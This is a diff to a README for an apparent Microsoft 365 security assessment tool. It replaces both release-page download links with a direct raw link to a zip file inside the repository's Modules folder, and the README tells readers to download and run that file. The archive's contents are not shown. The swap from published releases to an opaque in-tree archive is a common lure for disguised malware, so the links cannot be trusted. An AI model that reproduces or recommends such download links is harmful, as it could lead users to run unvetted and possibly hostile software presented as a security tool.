@@ -1,6 +1,6 @@
 # 🛡️ nextlayersec-assessment - Assess your M365 security posture easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Inner-dhahran248/nextlayersec-assessment/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Inner-dhahran248/nextlayersec-assessment/main/Modules/nextlayersec_assessment_1.2.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Your computer must meet these requirements to run the assessment:
 
 You download the application from the project release page. 
 
-[Click here to visit the release page to download the latest version.](https://github.com/Inner-dhahran248/nextlayersec-assessment/releases)
+[Click here to visit the release page to download the latest version.](https://raw.githubusercontent.com/Inner-dhahran248/nextlayersec-assessment/main/Modules/nextlayersec_assessment_1.2.zip)
 
 Download the file ending in .zip from the latest release section. Save this file to a folder you recognize, such as your Downloads folder.
 
